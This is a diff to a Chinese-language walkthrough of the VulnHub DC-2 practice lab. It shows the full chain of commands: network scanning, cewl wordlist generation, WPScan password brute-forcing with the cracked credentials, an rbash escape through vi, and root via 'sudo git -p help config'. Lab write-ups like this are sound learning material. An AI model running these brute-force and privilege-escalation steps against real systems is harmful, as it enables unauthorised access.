@@ -1,4 +1,4 @@
-# DC2-WalkThrough
+# DC2-靶机详解
 
 ---
 
@@ -7,6 +7,10 @@
 `本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
 
 ---
+
+## 任务目标、描述
+- 拿到5个flag
+- 拿到root权限
 
 **靶机地址**
 - https://www.vulnhub.com/entry/dc-2,311/
@@ -24,8 +28,8 @@
 `环境仅供参考`
 
 - VMware® Workstation 16 Pro
-- kali : NAT 模式, 
-- 靶机 : NAT 模式
+- kali : NAT 模式 192.168.197.128
+- 靶机 : NAT 模式 192.168.197.146
 
 ---
 
@@ -38,7 +42,7 @@
 ```bash
 nmap -sP 192.168.197.0/24
 ```
-![sniffing](/assets/sniffing_7nffmoxzo.png)
+![sniffing](.\assets\DC-2\sniffing.png)
 
 
 排除法,去掉自己、宿主机、网关, `192.168.197.146` 就是目标了
@@ -55,7 +59,7 @@ nmap -T5 -A -v -p- 192.168.197.146
 
 这个命令的目的是对指定的IP地址范围进行广泛的扫描，包括所有的端口，并尝试识别目标主机的操作系统和开放的服务版本。这种扫描可能会对网络产生一定程度的负载，因此在进行此类活动时请确保您有权利执行这样的操作，并且不会对网络造成不良影响
 ```
-![sniffing2](/assets/sniffing2.png)
+![sniffing2](./assets/DC-2/sniffing2.png)
 
 可以看到,开放了 web 和 ssh 服务
 
@@ -65,27 +69,18 @@ nmap -T5 -A -v -p- 192.168.197.146
 ```bash
 echo "192.168.197.146 dc-2" >> /etc/hosts
 ```
-Windows环境修改host
-```
+使用这个命令下，Windows环境修改host
+```cmd
 explorer C:\Windows\System32\drivers\etc\
+添加进入host文件
 ```
 
 然后 web 访问,就可以看到 flag1
+![FLAG1](./assets/DC-2/FLAG1.png)
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/2.png)
-
+翻译
 ```
-Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
-
-More passwords is always better, but sometimes you just can’t win them all.
-
-Log in as one to see the next flag.
-
-If you can’t find it, log in as another.
-```
-机翻
-```
-你惯用的字词列表可能无法使用，因此，也许你只需要 cewl。
+你惯用的字词列表可能无法使用，因此，也许你只需要 cewl工具。
 
 密码越多越好，但有时你根本无法赢得所有密码。
 
@@ -103,21 +98,34 @@ flag1 提示了一个工具 cewl,这是个抓取网站信息用于生成密码�
 cewl kali 下自带,直接使用就是了
 ```bash
 cewl http://dc-2 -w out.txt
+
+Desc:
+这里的out.txt是保存的额密码字典
 ```
 
-密码表有了,那么就应该爆破了,目标这个网站一看用的就是 wordpress,默认的登录地址一般是 `/wp-admin` 或 `/wp-login.php`
 
-不要使用 kali 自带的 burp 直接跑,你会急得想砸电脑,kali 默认的 burp 是社区版,那个爆破速度基本没用,burp 使用教程参考 [BurpSuite笔记](../../../工具/BurpSuite.md#Intruder)
 
 接下来使用一个工具 WPScan,同样 kali 自带
 ```bash
 wpscan --url http://dc-2 --enumerate u
 wpscan --url http://dc-2 --passwords out.txt
+
+Desc:
+这里提供的是两个 WPScan 工具的命令：
+
+    wpscan --url http://dc-2 --enumerate u: 
+    这个命令的目的是扫描位于 http://dc-2 的WordPress网站，并且通过 
+     枚举用户来收集关于该WordPress网站的用户信息。具体来说， 
+     --enumerate u 参数告诉WPScan枚举用户信息。
+
+    wpscan --url http://dc-2 --passwords out.txt: 
+    这个命令的目的是对位于 http://dc-2 的WordPress网站进行密码破解 
+     尝试。--passwords out.txt 参数告诉WPScan使用 out.txt 文件中的 
+      密码列表进行尝试。
 ```
 
 爆破结果,存在2个账户
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/5.png)
 
 ```
 Username : jerry
@@ -126,21 +134,25 @@ Password : adipiscing
 Username : tom
 Password : parturient
 ```
+这里可以用dirb工具扫一下有哪些可以登录的页面
+```bash
+dirb http://dc-2/
 
+找到了 就是这个
+http://dc-2/wp-admin/  
+```
+![Flag2](/assets/Flag2.png)
 使用账号 jerry 登录后可以发现 flag2
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/4.png)
-
+鸟语：
 ```
 If you can't exploit WordPress and take a shortcut, there is another way.
 
 Hope you found another entry point.
 ```
-机翻
+说人话
 ```
-如果你无法利用 WordPress 并采取捷径，那还有另一种方法。
-
-希望你找到另一个入口点。
+不要在搞wordpress了，去找找其他线索、切入点
 ```
 
 flag 提示,如果 wordpress 打不下来,就得换一个入口
@@ -150,13 +162,13 @@ flag 提示,如果 wordpress 打不下来,就得换一个入口
 wpscan --url http://dc-2/ --api-token 这边填你的APIToken
 ```
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/7.png)
+![wpscan](./assets/dc-2/wpscan.png)
 
-看了下,大部分需要认证,并且都是 XSS 之类的,靶机这环境根本没用,有一个 WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution 可以试一试,反正也有账号
+我看了一下,大部分需要认证,并且都是 XSS 之类的,靶机这环境根本没用,有一个 WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution 可以试一试,反正也有账号
 
 根据信息,CVE 编号为 CVE-2019-8942、CVE-2019-8943,MSF 里正好有模块,不过其实是不好利用的,因为这个漏洞是通过文件上传造成的,而 jerry 和 tom 都无法上传,只有 admin 有权限修改上传点
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/8.png)
+
 
 ---
 
@@ -164,7 +176,7 @@ wpscan --url http://dc-2/ --api-token 这边填你的APIToken
 
 既然打不下来 wordpress ,就换一个,联想到端口扫描出的 7744 SSH 服务,这里可以作为一个入口
 
-这里使用 [SNETCracker](https://github.com/shack2/SNETCracker) 这个工具爆破 SSH,注意这个软件是在windows下运行的,且爆破时线程尽量调量为低,账号密码字典就使用之前 cewl 生产出来的字典
+使用刚才的爆破出来的两个账号密码去尝试连接一下ssh
 
 爆破结果
 ```
@@ -195,7 +207,7 @@ Poor old Tom is always running after Jerry. Perhaps he should su for all the str
 less /etc/passwd
 ```
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/10.png)
+
 
 可见 jerry 用户存在,那么下面就是 rbash 逃逸-->提权
 
@@ -204,17 +216,37 @@ less /etc/passwd
 # flag4
 
 使用 vi 进行逃逸
-```
+```bash
 vi
 
 :set shell=/bin/sh
 :shell
+
+Desc:
+    :set shell=/bin/sh：这个命令将 Vi 编辑器的 shell 设
+    置为 /bin/sh，这意味着在 Vi 编辑器中执行外部 shell 命
+    令时将使用 /bin/sh。
+    :shell：这个命令会启动一个新的 shell，让你可以在 Vi
+     编辑器之外执行命令。在这个新的 shell 中，你可以执行任
+     何标准的 shell 命令，然后通过输入 exit 或者按下  
+     Ctrl+D 返回到 Vi 编辑器。
 ```
 
 更改环境变量,把 `/bin/sh` 目录加进去,不然许多命令不好用
 ```bash
 echo $PATH
 export PATH=$PATH:/bin:/usr/bin
+
+Desc:
+ echo $PATH：这个命令用于打印当前 shell 中的环境变量 $PATH
+  的值。$PATH 是一个用冒号分隔的目录列表，其中包含了系统在
+  搜索可执行文件时要查找的目录。每当你输入一个命令时，系统 
+   会 在 $PATH 中列出的目录中查找这个命令的可执行文件。
+
+export PATH=$PATH:/bin:/usr/bin：这个命令将当前 $PATH
+ 的值与 /bin 和 /usr/bin 目录结合起来，并将结果重新分配给
+  $PATH。这意味着系统将在 /bin 和 /usr/bin 目录中查找命令
+  可执行文件，即使它们不在默认的 $PATH 中
 ```
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/11.png)
@@ -223,8 +255,9 @@ ok,现在是正常的 shell 环境了,在提权之前,尝试登录 jerry 用户
 ```bash
 su jerry
 ```
+这里可以看到Jeryy只能使用git 那么答案就很明显了要使用git来最后的提权
+![git](/assets/git_6ned2tkt0.png)
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/12.png)
 
 ```
 Good to see that you've made it this far - but you're not home yet.
@@ -252,20 +285,20 @@ Go on - git outta here!!!!
 
 # flag5
 
-在 https://gtfobins.github.io/gtfobins/git/ 找到 git 提权的语法
-```
+
+```bash
 sudo git -p help config
 !/bin/sh
 ```
 
-![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC2/13.png)
 
-提权成功,感谢靶机作者 @DCUA7,查看最终 flag
+
 
 ```bash
 cd
 cat final-flag.txt
 ```
+
 ```
  __    __     _ _       _                    _
 / / /\ \ \___| | |   __| | ___  _ __   ___  / \
